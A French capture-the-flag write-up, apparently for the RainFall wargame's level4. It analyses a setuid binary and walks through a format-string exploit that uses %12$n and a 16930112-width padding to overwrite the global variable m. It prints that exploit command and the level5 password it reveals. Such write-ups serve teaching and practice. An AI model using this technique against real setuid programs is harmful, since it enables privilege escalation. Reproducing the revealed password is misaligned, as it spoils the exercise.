@@ -1,0 +1,67 @@
+J'arrive sur le home de l'user level4.
+
+	level4@RainFall:~$ ls -la level4
+	-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
+
+Il y a un fichier level4 appartenant a l'user level5
+
+	level4@RainFall:~$ file level4
+	level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped
+
+Le fichier ce lanceras avec les droit le level5.
+
+J'envoie le fichier dans mon linux pour le decompiler avec cutter
+
+Le programme ne prend aucun argument, il appelle une fonction n qui prend une chaine dans l'entrée a travers fgets. La valeurs est d'une taille max de 512 charactères.
+Ensuite il appele la fonction p et affiche dans un printf la valeurs précédement lue.
+Ensuite la variable global m est lue est comparer a la valeurs 0x1025544 (16930116), si elle est identique alors le programme affiche le contenu de .pass.
+
+C'est la même faille a exploité que dans le level précedent. Sauf qu'ici nous n'allons pas pouvoir écrire 16930116 pour récrire le contenu de m étant donnée que fgets nous limite a 512 charactères.
+
+Je vais chercher l'addresse de la variable global m
+
+	level4@RainFall:~$ gdb -q level4
+	Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
+	(gdb) info variable
+	All defined variables:
+
+	Non-debugging symbols:
+	0x08048588  _fp_hw
+	0x0804858c  _IO_stdin_used
+	0x080486f8  __FRAME_END__
+	0x080496fc  __CTOR_LIST__
+	0x080496fc  __init_array_end
+	0x080496fc  __init_array_start
+	0x08049700  __CTOR_END__
+	0x08049704  __DTOR_LIST__
+	0x08049708  __DTOR_END__
+	0x0804970c  __JCR_END__
+	0x0804970c  __JCR_LIST__
+	0x08049710  _DYNAMIC
+	0x080497dc  _GLOBAL_OFFSET_TABLE_
+	0x080497fc  __data_start
+	0x080497fc  data_start
+	0x08049800  __dso_handle
+	0x08049804  stdin@@GLIBC_2.0
+	0x08049808  completed.6159
+	0x0804980c  dtor_idx.6161
+	0x08049810  m
+
+Le principe reste le même on vas exploité la faille format string.
+
+
+Je check l'emplacement ou commence l'écriture de mon programme dans la mémoire.
+
+	level4@RainFall:~$ python -c 'print "AAAABBBBCCCCDDDD" + " %x"*15' | ./level4
+	AAAABBBBCCCCDDDD b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141 42424242 43434343 44444444
+
+La première addresse lu ce trouve a la 12 place.
+
+On vas écrire notre ligne a eploiter avec une subitliter comme nous ne pouvons pas écrire 16930116 (le buffer limité a 512 charactères), nous allons utilisé le flag i et lui donnée une précision de 16930116 - 4 (16930112)
+
+
+	level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' | ./level4
+
+Ce qui nous donne accès au fichier .pass du level5
+
+	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
